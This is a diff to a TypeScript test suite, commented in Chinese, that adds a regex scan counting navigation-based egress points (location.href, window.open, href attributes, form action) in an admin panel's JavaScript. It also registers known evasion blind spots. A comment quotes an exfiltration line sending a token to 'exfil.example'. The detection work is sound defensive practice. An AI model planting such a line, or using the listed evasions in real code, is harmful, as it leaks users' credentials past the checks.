@@ -394,12 +394,27 @@ const EGRESS_FORMS: ReadonlyArray<{ label: string; re: RegExp }> = [
   { label: "fetch 别名（当值取用）", re: /(?<![A-Za-z0-9_$-])fetch\s*(?=[;,)\]}]|$)/g },
 ];
 
-/** 一段源码里的网络出口处数。**注释与模板串字面文本都不算。** */
-function egressSites(src: string): number {
-  const code = stripTemplateText(
+/**
+ * 一段源码里**真会执行的那一半**：注释与模板串字面文本都抠掉。
+ *
+ * ⚠️ **`egressSites()` 与 `navEgressSites()` 共用这一份，不许各抠各的**：两道扫描的
+ * 「什么不算」必须逐字相同，否则同一段注释在一道里是豁免、在另一道里是命中，
+ * 而那种不一致只有在有人往注释里写代码那天才看得见（本仓注释**极爱复述代码**，
+ * 且已有三处注释里逐字写着导航一族的 token）。
+ * ⚠️ **边界照旧**：块注释这一步用的是正则，`tests/helpers/strip-comments.ts` 登记着
+ * 「字符串里的 `/*` 会被当成块注释开头」那个坑。**今天 `admin-ui/js` 下零处含 `/*`
+ * 的字符串**（实地数过），所以这里保持原样不动；哪天有了，两道扫描会一起变瞎。
+ */
+function codeOnly(src: string): string {
+  return stripTemplateText(
     // 注释里提到这些名字不算出口（本仓注释极爱复述代码）。
     src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1"),
   );
+}
+
+/** 一段源码里的网络出口处数。**注释与模板串字面文本都不算。** */
+function egressSites(src: string): number {
+  const code = codeOnly(src);
   let n = 0;
   for (const { re } of EGRESS_FORMS) {
     // ⚠️ **每次都归零。** `String.matchAll()` 会把当时的 `lastIndex` 复制进它的克隆
@@ -737,5 +752,266 @@ describe("面板的网络出口清单", () => {
     const lines = src.split("\n").filter((l) => /\bfetch\s*\(/.test(l));
     expect(lines, "这个文件里 fetch( 的处数变了").toHaveLength(1);
     expect(lines[0]!.trimStart().startsWith("return `"), `不是模板串里的示例文本：${lines[0]}`).toBe(true);
+  });
+});
+
+/**
+ * ── **导航一族的出口：P3d 全分支评审 F-3 补的那张表** ────────────────────────────
+ *
+ * ⚠️⚠️ **为什么它必须是独立的一张表、而不是往 `EGRESS_FORMS` 里再塞几条**：
+ * 上面那张表数的是「**取数**」（`fetch` / `XHR` / `EventSource` / `sendBeacon` /
+ * `WebSocket` / 动态 `import`），它的处数直接支撑 `admin-ui/js/api.js` 文件头那段
+ * 「口令只走请求头」的安全论证，**恰好三处**是那段论证的前提。
+ * 导航一族是**另一件事**：它不取数，它把**当前这一页**（或一个新标签页）送去某个地址，
+ * 而地址是可以拼字符串的。两族混进同一个计数里，那段安全论证的前提就说不清了。
+ *
+ * ⚠️⚠️⚠️ **这一族不是随便挑的，它正是本仓自己的威胁模型点名的那一族。**
+ * `admin-ui/js/pure/session.mjs` 的文件头**自己写着**：
+ * 「CSP 的 `connect-src 'self'` 挡得住把口令 fetch 出去，`form-action 'none'` 挡得住
+ * 表单外传，**但挡不住 `location.href = "https://…?k=" + token` 这种导航式外传**
+ * ——CSP 已经没有可用的指令拦它（`navigate-to` 被规范移除了）。」
+ * ⇒ **仓库知道这是 CSP 拦不住的那条外发通道，却把它漏在了唯一枚举外发形态的那张表外面。**
+ * 而 P3d 的 `admin-ui/js/sec-playground.js` 有两处注释**专门讨论过 `window.open()`**
+ * （「它从来不补 `noopener`」）——**作者当期正面想到过这一族，表还是没补。**
+ *
+ * **【实测，评审当场种的那一次】**：往 `admin-ui/js/sec-playground.js` 的
+ * `cancelInFlight()` 里插一行
+ * `location.href = "https://exfil.example/collect?k=" + token;`，
+ * 走完作者的正常流程（改文件 → `node scripts/build-ui.mjs` → 跑全量）之后
+ * ⇒ **`pnpm test` 126 files / 2665 passed，十二道门禁一道都不吵。**
+ * ⚠️ 中途单跑 `tests/unit/ui-assets.test.ts` 确实红过一次，**但它红在「生成物漂移」**
+ * ——账本 `:465` 记的正是这个形状：「**门禁红了不等于门禁抓住了你以为的那件事**」。
+ *
+ * ── **今天这张表里的每一条，为什么长这个样子（逐条实测）** ──────────────────────
+ * · **`.href` 被赋值**（`/\.\s*href\s*=(?!=)/`）——一条规则同时盖住
+ *   `location.href = u`、`window.location.href = u`、`a.href = u`，以及**别名**
+ *   （`const l = location; l.href = u`）。判据落在「`href` 这一格被写」上而不是落在
+ *   「接收者叫 location」上，正是因为后者一个变量名就绕过去了。
+ *   `(?!=)` 挡住 `===`；`target.href` 那种**读**（`js/gw-api.js` 真实写法）不匹配。
+ * · **`location` 整体被赋值**（`/\blocation\s*=(?!=)/`）——`location = u` /
+ *   `window.location = u` / `document.location = u` 三种同时盖住。
+ *   `exOrigin = location.origin;`（`js/sec-settings.js` 真实写法）不匹配：它后面是 `.`。
+ * · **`location.assign(` / `location.replace(`** —— **必须带 `location` 前缀**：
+ *   裸 `assign(` 会打中 `js/api.js` 真实的 `Object.assign(headers, …)`，
+ *   裸 `replace(` 会打中 `js/pure/format.mjs` 那两处 `String.prototype.replace`
+ *   与 `js/sec-settings.js` 的 `.replace(/^env:/, "")`。**这三处都是实地数出来的，不是想的。**
+ * · **`open(`**（`/(?<![A-Za-z0-9_$-])open\s*\(/`）—— 同时盖住 `window.open(` 与裸 `open(`。
+ *   前置否定挡住 `js/ui.js` 真实的 `openModal(`（`open` 后面跟的是 `M` 不是 `(`，
+ *   所以其实是判据本身挡住的）与 `reopen(` 这类后缀形态。
+ *   **实地喂过整棵 `admin-ui/js`：今天零命中**（`i18n-dict.js` 的英文文案里没有 `open (`）。
+ * · **`href:` 属性字面量** —— 这是本仓**真正在用**的那种写法（`el("a", { href: url })`），
+ *   今天恰好两处，都在下面那张表里。不收它的话这道扫描在真实代码上一个命中都没有，
+ *   而**一张全零的清单与一道全瞎的扫描长得一模一样**。
+ * · **`setAttribute("href"/"action", …)`** —— `el()` 内部走的是 `setAttribute(name, …)`
+ *   （名字是变量，扫不到，也不该扫：它是那条通用路径），但**直接写字面量**是另一条路，
+ *   补上它是零成本（今天零命中）。
+ * · **`.action` 被赋值** —— `form.action = u`。`js/sec-playground.js` 真实的
+ *   `step.action === "giveUp"` 与 `js/pure/playground.mjs` 的 `{ action: "giveUp" }`
+ *   都不匹配（前者被 `(?!=)` 挡住，后者是 `action:` 不是 `.action =`）。
+ *   ⚠️ **表单那一族今天另有 CSP `form-action 'none'` 兜着**，收它是第二层，不是唯一一层。
+ */
+const NAV_EGRESS_FORMS: ReadonlyArray<{ label: string; re: RegExp }> = [
+  { label: "href 被赋值（含 location.href / a.href / 别名）", re: /\.\s*href\s*=(?!=)/g },
+  { label: "location 整体被赋值", re: /\blocation\s*=(?!=)/g },
+  { label: "location.assign(", re: /\blocation\s*\.\s*assign\s*\(/g },
+  { label: "location.replace(", re: /\blocation\s*\.\s*replace\s*\(/g },
+  { label: "open(（含 window.open）", re: /(?<![A-Za-z0-9_$-])open\s*\(/g },
+  { label: "href: 属性字面量", re: /(?<![A-Za-z0-9_$-])href\s*:/g },
+  { label: 'setAttribute("href"/"action")', re: /setAttribute\(\s*["'](?:href|action)["']/g },
+  { label: "form 的 action 被赋值", re: /\.\s*action\s*=(?!=)/g },
+];
+
+/** 一段源码里的**导航出口**处数。**注释与模板串字面文本都不算**（与取数那道共用 `codeOnly()`）。 */
+function navEgressSites(src: string): number {
+  const code = codeOnly(src);
+  let n = 0;
+  for (const { re } of NAV_EGRESS_FORMS) {
+    // ⚠️ **每次都归零**，理由与 `egressSites()` 里那段逐字相同（`matchAll` 会复制 `lastIndex`）。
+    re.lastIndex = 0;
+    n += [...code.matchAll(re)].length;
+    re.lastIndex = 0;
+  }
+  return n;
+}
+
+/**
+ * **已知抓不住的导航写法，连同为什么接受一起登记。**
+ * 形态照抄上面那张 `BLIND_SPOTS`——**边界是断言，不是散文**。
+ */
+const NAV_BLIND_SPOTS: ReadonlyArray<{ probe: string; why: string }> = [
+  {
+    probe: 'const p = "hr" + "ef"; window.location[p] = u;',
+    why: "**被写的那一格是拼出来的时扫不到**（`window.location[p] = u`）。"
+      + "⚠️ **注意射程比想的宽一点，别把这条读大了**：`href` 那条规则落在「`href` 这一格被写」上、"
+      + "不落在接收者叫什么，所以**接收者**拼出来是抓得住的"
+      + "（`window[k].href = u` 实测被数出来 1，这也是它进不了本表的原因）。"
+      + "真正逃得掉的只有**属性名本身**也被拼出来的那一种 —— **属于刻意绕开**，"
+      + "本来就不在一道文本扫描的射程里，与取数那张表的 `globalThis[\"fetch\"]` 是同一条天花板。",
+  },
+  {
+    probe: "const go = location.assign; go(u);",
+    why: "**把跳转方法当值取用扫不到**：`location.assign` 后面不跟 `(`，"
+      + "判据要求紧跟括号。⚠️ **为什么不照 `fetch` 别名那条也写一遍**："
+      + "`fetch` 本来就是一个到处传来传去的函数（本仓 `src/core/` 零 IO、fetcher 一律"
+      + "依赖注入），而 `location.assign` 在真实代码里几乎只会被直接调用。"
+      + "多写一条正则的代价是它可能写反（本仓那张表上就记着写反两次的后果），"
+      + "收益是一种没人这么写的形态。**今天登记，不今天补。**",
+  },
+  {
+    probe: 'el("a", { ["href"]: u });',
+    why: "**计算属性名扫不到**：`href:` 那条是词法钩子，只认写死在那里的名字。"
+      + "与 `tests/ui/dom/playground-section.test.ts` 的 `classKeySites()` 登记的"
+      + "是同一条边界（那边实测过 `el(\"p\", { [K]: … })` 逃得掉）。",
+  },
+  {
+    probe: 'history.pushState(null, "", u);',
+    why: "**同源导航 API 不在这张表里，这是刻意的**：`history.pushState` / `replaceState` "
+      + "**按规范只接受同源 URL**，跨源会抛 `SecurityError` ⇒ 它送不出口令。"
+      + "把它收进来只会让这道扫描开始吵一件它拦不住也不需要拦的事。"
+      + "⚠️ `location.replace(` 与它名字像但性质完全不同（那一条**可以**跨源），所以那一条在表里。",
+  },
+  {
+    probe: 'const html = `<a href="${u}">x</a>`;',
+    why: "**拼 HTML 字符串扫不到**：`codeOnly()` 会把模板串的字面文本抠掉，"
+      + "`href=\"` 那几个字随之消失。**今天零风险**：本仓 `admin-ui/js` 下"
+      + "**没有任何一处 `innerHTML` / `insertAdjacentHTML` / `document.write`**"
+      + "（一切节点都由 `js/ui.js` 的 `el()` 造），那条路根本没有入口。"
+      + "⚠️ 这是「今天没有入口」，不是「结构上不可能」——哪天有人开了 `innerHTML`，"
+      + "这条盲点当场变活，而 CSP 的 `script-src 'self'` 拦不住一个 `<a href>`。",
+  },
+];
+
+describe("面板的导航出口清单（CSP 拦不住的那一族）", () => {
+  /**
+   * **按文件计数，不按行号**（与取数那张表同一条理由：行号断言过不了三轮就会被放宽）。
+   *
+   * ⚠️ **期望值不是空表，这一点很重要**：一张全零的清单与一道正则全写坏了的扫描
+   * **在机器上长得一模一样**。今天真实存在的两处导航出口都摆在这里，
+   * ⇒ 判据写坏 ⇒ 这一格立刻红成「少了两处」。
+   *
+   * 两处各自是什么、为什么它们是合法的：
+   * · `js/sec-events.js` —— 事件下载那条链接，`href` 是**本地造出来的** blob/data 地址
+   *   （不是上游给的），点它只会把一份 txt 存到本地。
+   * · `js/sec-playground.js` —— 媒体结果那条「在新标签页打开」，
+   *   `href` 由 `mediaLinkable()` **白名单**过（只放行 `^https?://`），
+   *   而且元素**显式**带 `rel="noopener noreferrer"`（不给被打开的那一页 `opener` 引用，
+   *   也不把面板自己的地址泄给上游给的那个主机）。
+   *
+   * ⚠️ **这一格不担保那两处是安全的**，它担保的是「导航出口的处数与位置没变」。
+   * 那两处各自的安全性由 `tests/ui/playground-media.test.ts` 与
+   * `tests/ui/dom/playground-section.test.ts` 的「结果链接带 rel 的 noopener noreferrer 两条」守。
+   */
+  it("导航出口恰好两处：events 的下载链接、playground 的「在新标签页打开」", () => {
+    const counts: Record<string, number> = {};
+    for (const f of walkJs("admin-ui/js")) {
+      const n = navEgressSites(readFileSync(f, "utf8"));
+      if (n > 0) counts[f] = n;
+    }
+    expect(
+      counts,
+      "导航出口的数量或位置变了。**这一族是 CSP 拦不住的那一族**"
+      + "（`js/pure/session.mjs` 文件头逐字写着 `form-action 'none'` 挡不住 "
+      + "`location.href = \"https://…?k=\" + token`）——"
+      + "新增一处之前，先确认那个地址不是拼出来的、也不带任何本地状态",
+    ).toEqual({
+      "admin-ui/js/sec-events.js": 1,
+      "admin-ui/js/sec-playground.js": 1,
+    });
+  });
+
+  /**
+   * **正向自检：表里的每一种写法都真的被数出来。**
+   *
+   * 少了这一格的话，把任何一条正则写坏（少一个反斜杠、否定先行断言方向写反）
+   * 都不会有任何东西变红——上面那格今天只靠 `href:` 那一条规则就能凑齐两处，
+   * **其余七条一条都匹配不上时它照样是绿的**。
+   *
+   * ⚠️ **期望值全部手写字面量**（第 6 种假阳性：不许从 `NAV_EGRESS_FORMS` 推导）。
+   * ⚠️ **`window.location.href = u` 必须恰好是 1、不是 2**：它同时钉住
+   * 「`.href` 赋值」与「`location` 整体赋值」两条规则互斥
+   * ——`location` 后面跟的是 `.` 不是 `=`。写成 `/\blocation\s*\.?\s*=/` 会数两遍，
+   * 而上面那格会红成「多了一个出口」，**病因会被读错**。
+   */
+  it.each([
+    ["location.href = u;", 1, "评审当场种的那一条，逐字就是这个形状"],
+    ["window.location.href = u;", 1, "带 window 前缀 —— 恰好一次，两条规则不许重复计数"],
+    ["a.href = u;", 1, "<a> 元素的 href 动态赋值"],
+    ["const l = location; l.href = u;", 1, "别名：判据落在 href 那一格被写，不落在接收者叫什么"],
+    ['const k = "loca" + "tion"; window[k].href = u;', 1, "接收者拼出来也抓得住 —— NAV_BLIND_SPOTS 第一条的射程说明就靠这一条钉着"],
+    ["location = u;", 1, "整个 location 被赋值"],
+    ["window.location = u;", 1, "同上，带 window 前缀"],
+    ["location.assign(u);", 1, "跳转方法之一"],
+    ["location.replace(u);", 1, "跳转方法之二（它可以跨源，与 history.replaceState 不是一回事）"],
+    ["window.open(u);", 1, "开新标签 —— 它从来不补 noopener"],
+    ['open(u, "_blank");', 1, "裸 open( 也算"],
+    ['el("a", { href: u });', 1, "本仓真正在用的那种写法"],
+    ['node.setAttribute("href", u);', 1, "字面量属性名的另一条路"],
+    ['node.setAttribute("action", u);', 1, "表单那一条同理"],
+    ["form.action = u;", 1, "表单地址被改写（CSP form-action 'none' 是第二层，不是唯一一层）"],
+  ])("正向自检：这一种写法真的被数出来：%s", (probe, expected) => {
+    expect(navEgressSites(probe as string)).toBe(expected as number);
+  });
+
+  /**
+   * ── **反向控制：仓里真实存在的同族写法一个都不许被误红** ────────────────────────
+   *
+   * ⚠️⚠️ **这一格才是这张表能不能活下来的那一格。** 一道会因为「有人写了
+   * `Object.assign(...)`」或者「有人调了一次 `String.prototype.replace`」而变红的护栏，
+   * **过不了三轮就会被人顺手放宽**，放宽之后它什么都不守了
+   * ——上面那张取数表的注释里逐字记着第一版被 `i18n-dict.js` 的英文文案打红的经过。
+   *
+   * **下面每一条都逐字取自 `admin-ui/js` 下的真实代码**（文件与行数写在说明里），
+   * 不是想出来的边界。
+   */
+  it.each([
+    ["const o = location.origin;", 0, "js/sec-settings.js 与 js/sec-playground.js 真实写法：读 origin"],
+    ["return await fetch(target.href, {});", 0, "js/gw-api.js 真实写法：读 .href，不是写"],
+    ["headers: Object.assign(headers, extra),", 0, "js/api.js 真实写法：Object.assign 不是 location.assign"],
+    ['t("set.lockedBy", { env: String(x).replace(/^env:/, "") })', 0, "js/sec-settings.js 真实写法：String.replace"],
+    ['String(v).replace(/\\B(?=(\\d{3})+(?!\\d))/g, ",")', 0, "js/pure/format.mjs 真实写法：千分位分隔"],
+    ['if (step.action === "giveUp") return;', 0, "js/sec-playground.js 真实写法：=== 不是赋值"],
+    ['return { action: "giveUp" };', 0, "js/pure/playground.mjs 真实写法：action: 不是 .action ="],
+    ["openModal(titleKey, bodyNode, actions);", 0, "js/ui.js 真实写法：openModal 不是 open("],
+    ['const trigger = elI18n("button", "keys.addMenu.open", {});', 0, "js/sec-keys.js 真实写法：i18n key 里的 open"],
+    ["const el = document.createElement(tag);", 0, "造节点本身不是导航"],
+    // 纯形态边界（不是真实写法，但它们与真实写法只差一个字符）：
+    ["const reopen = 1;", 0, "open 是另一个标识符的后缀"],
+    ["x.hrefValue = 1;", 0, "href 是另一个属性名的前缀"],
+    ["if (a.href === b.href) return;", 0, "两边都是读，=== 不许被当成赋值"],
+    ["const hasAction = o.action !== undefined;", 0, "!== 同样不是赋值"],
+  ])("反向控制：这一种合法写法不许被数成出口：%s", (probe, expected) => {
+    expect(navEgressSites(probe as string)).toBe(expected as number);
+  });
+
+  /**
+   * **已知抓不住的写法确实抓不住 —— 边界是断言，不是散文。**
+   * **这一格变红意味着有人把某个盲点补上了——那是好事**，把对应的 `NAV_BLIND_SPOTS` 行删掉即可。
+   */
+  it.each(NAV_BLIND_SPOTS)("已知抓不住的导航写法确实抓不住（边界是断言，不是散文）：$why", ({ probe }) => {
+    expect(navEgressSites(probe), "这条写法现在被数出来了，请把它从 NAV_BLIND_SPOTS 里删掉").toBe(0);
+  });
+
+  /**
+   * **`admin-ui/js` 下今天没有任何一条拼 HTML 的路** —— 上面 `NAV_BLIND_SPOTS`
+   * 最后那条「拼 HTML 字符串扫不到」是**一句关于今天的话**，这一格把它变成可观测的。
+   *
+   * ⚠️ 少了这一格，那条盲点说明里的「今天零风险」会随时静静变假：
+   * 有人开一次 `innerHTML`，导航一族就多出一条这张表完全看不见的路，
+   * **而这张表照样全绿**。
+   */
+  it("admin-ui/js 下零处 innerHTML / insertAdjacentHTML / document.write —— 拼 HTML 那条盲点今天没有入口", () => {
+    const bad: string[] = [];
+    for (const f of walkJs("admin-ui/js")) {
+      const code = codeOnly(readFileSync(f, "utf8"));
+      for (const m of code.matchAll(/\b(innerHTML|outerHTML|insertAdjacentHTML|document\s*\.\s*write)\b/g)) {
+        bad.push(`${f}: ${m[1]}`);
+      }
+    }
+    expect(
+      bad,
+      "有人开了一条拼 HTML 的路 —— 导航一族从此多一条这张表看不见的出口"
+      + "（`<a href=\"…\">` 拼在字符串里，`codeOnly()` 会把它连同模板串字面文本一起抠掉）。"
+      + "把 NAV_BLIND_SPOTS 里那条「今天零风险」改真，并重新评估这道扫描的射程",
+    ).toEqual([]);
   });
 });
